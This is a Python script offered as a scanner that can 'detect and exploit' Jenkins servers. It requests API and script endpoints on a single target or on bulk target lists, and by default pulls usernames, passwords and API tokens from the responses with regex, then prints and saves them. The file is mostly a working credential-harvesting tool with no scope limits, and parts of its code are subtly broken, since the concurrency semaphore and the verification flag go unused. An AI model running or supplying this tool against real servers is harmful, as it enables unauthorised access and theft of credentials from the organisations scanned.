#!/usr/bin/env python3
"""
Jenkins Credential Exposure Scanner — Detect and Exploit Leaked Credentials
============================================================================
Scans for misconfigured or vulnerable Jenkins instances that expose sensitive
credentials through unauthenticated or improperly secured API endpoints.

Key vulnerability classes:
  - Misconfiguration: Unauthenticated access to /script or /view endpoints.
  - Disclosure: Credentials exposed via API endpoints or error messages.
  - Optional exploitation by extracting exposed credentials.

Usage:
  # Scan a single target
  python jenkins_credential_exposure_scanner.py --target http://jenkins.example.com

  # Detection only — disables exploitation of credential leaks
  python jenkins_credential_exposure_scanner.py --target http://jenkins.example.com --safe

  # Bulk scan multiple targets with concurrency
  python jenkins_credential_exposure_scanner.py --list targets.txt --concurrency 50 --output results.json

  # Disable TLS verification for self-signed certificates
  python jenkins_credential_exposure_scanner.py --list targets.txt --no-verify

References:
  - https://www.jenkins.io/security/
  - https://nvd.nist.gov/vuln/search/results?query=jenkins
  - https://www.synopsys.com/blogs/software-security/top-jenkins-security-best-practices/

"""
import asyncio
import json
import re
from typing import Optional, List, Union
from urllib.parse import urljoin

import argparse
import httpx
from datetime import datetime, timezone

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

TOOL_NAME = "jenkins_credential_exposure_scanner"
SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 10

DETECTION_URLS = [
    "/",
    "/api/json",
    "/script",
    "/securityRealm/user/admin/api/json"
]

CREDENTIAL_PATTERNS = [
    r'"username":"([a-zA-Z0-9._-]+)".*?"password":"([^"]+)"',
    r'"apiToken":"([^"]+)"',
    r"'username': '([^']+)', 'password': '([^']+)'",
]

# ── Utility Functions ────────────────────────────────────────────────────────

async def fetch(url: str, client: httpx.AsyncClient, no_verify: bool) -> httpx.Response:
    """Send an HTTP GET request and return the response."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
        return response
    except (httpx.RequestError, httpx.HTTPStatusError) as e:
        print(c(RED, f"[ERROR] Request to {url} failed: {e}"))
        return None


def extract_credentials(response_text: str) -> Optional[list[str]]:
    """Extract credentials from response text using regex patterns."""
    credentials = []
    for pattern in CREDENTIAL_PATTERNS:
        matches = re.findall(pattern, response_text)
        credentials.extend(matches)
    return credentials if credentials else None


async def scan_target(url: str, client: httpx.AsyncClient, safe: bool) -> dict:
    """Scan a single Jenkins target for possible credential exposure."""
    result = {
        "target": url,
        "vulnerable": False,
        "credentials": [],
        "info": "",
    }

    try:
        for detection_path in DETECTION_URLS:
            full_url = urljoin(url, detection_path)
            print(c(CYAN, f"[INFO] Scanning {full_url}"))
            response = await fetch(full_url, client, no_verify=False)

            if not response:
                continue

            if detection_path == "/":
                if "Jenkins" in response.text and "/api/json" in response.text:
                    result["info"] = "Jenkins instance detected."
                    print(c(GREEN, f"[INFO] Detected Jenkins at {url}"))

            if "/api/json" in response.url.path and "Jenkins" in response.text:
                # Check version from API
                version_match = re.search(r'"version":"([^"]+)"', response.text)
                if version_match:
                    result["info"] += f" Jenkins version: {version_match.group(1)}."

            if not safe:
                credentials = extract_credentials(response.text)
                if credentials:
                    result["vulnerable"] = True
                    result["credentials"].extend(credentials)
                    print(c(YELLOW, f"[HIGH] Found credentials: {credentials}"))

    except Exception as ex:
        print(c(RED, f"[ERROR] {ex}"))

    return result


async def main(args):
    # Validate and load targets
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        try:
            with open(args.list, "r") as file:
                targets = [line.strip() for line in file if line.strip()]
        except Exception as e:
            print(c(RED, f"[ERROR] Could not read file {args.list}: {e}"))
            return

    if not targets:
        print(c(RED, "[ERROR] No targets specified. Use --target or --list."))
        return

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [scan_target(target, client, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

    # Output results in JSON format
    if args.output:
        try:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=2)
            print(c(GREEN, f"[INFO] Results saved to {args.output}"))
        except Exception as e:
            print(c(RED, f"[ERROR] Could not write to {args.output}: {e}"))
    else:
        print(c(BOLD, "[RESULTS]"))
        print(json.dumps(results, indent=2))


# ── CLI Argument Parsing ─────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scan Jenkins instances for exposed credentials via API endpoints."
    )
    parser.add_argument("--target", type=str, help="Target URL to scan.")
    parser.add_argument("--list", type=str, help="File containing list of target URLs.")
    parser.add_argument("--output", type=str, help="Save results to a JSON file.")
    parser.add_argument("--safe", action="store_true", help="Detection only, no exploitation.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrent requests.")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS certificate verification.")

    args = parser.parse_args()

    # Run asyncio event loop
    asyncio.run(main(args))
